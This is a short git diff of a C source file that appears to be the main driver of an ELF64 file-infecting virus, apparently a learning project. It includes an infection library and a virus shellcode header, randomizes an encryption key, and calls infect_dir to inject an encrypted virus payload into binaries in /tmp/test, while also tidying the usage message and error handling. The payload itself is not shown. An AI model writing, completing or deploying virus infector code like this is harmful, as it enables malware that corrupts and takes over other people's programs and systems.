@@ -1,10 +1,11 @@
 #include "lib/lib.h"
 #include "lib/infect.h"
+#include "virus_shellcode.h"
 
 int usage(char *name){
 	print("usage: ./");
 	print(name);
-	print(" [--force] [--key YOUR_PRIVATE_KEY] binary\n\nnote: the binary must be in elf64\n");
+	print(" binary\n\nnote: the binary must be in elf64\n");
 	return -1;
 }
 
@@ -16,12 +17,6 @@ int randomize(char *k){
 	read(fd, (char *)k, sizeof(*k)*16);
 	return TRUE;
 }
-
-extern char KEY[16]; //defined in infect.c
-extern char OLD_KEY[16]; //defined in infect.c
-
-extern unsigned char virus_shellcode[];
-extern unsigned int virus_shellcode_len;
 
 int get_virus_info(char **v, size_t *l, size_t *c_off, size_t *c_len){
 	println("VIRUS INFO");
@@ -56,8 +51,10 @@ int main(int ac, char **av){
 	size_t virus_len;
 	size_t crypt_off;
 	size_t crypt_len;
-	get_virus_info(&virus, &virus_len, &crypt_off, &crypt_len);
+	if (get_virus_info(&virus, &virus_len, &crypt_off, &crypt_len) == FALSE)
+		return 1;
 	
 	randomize(KEY);
 	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len);
+	return 0;
 }
